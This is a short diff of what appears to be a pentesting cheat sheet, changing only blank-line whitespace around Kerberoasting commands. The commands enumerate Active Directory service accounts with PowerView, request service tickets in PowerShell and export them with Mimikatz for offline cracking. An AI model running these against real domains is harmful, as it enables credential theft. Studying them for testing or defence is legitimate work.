@@ -24,9 +24,9 @@ Get-NetUser -SPN | select serviceprincipalname #PowerView, get user service acco
 #Get TGS in memory
 Add-Type -AssemblyName System.IdentityModel 
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local 
- 
+
 klist #List kerberos tickets in memory
- 
+
 Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
 ```
 {% endcode %}
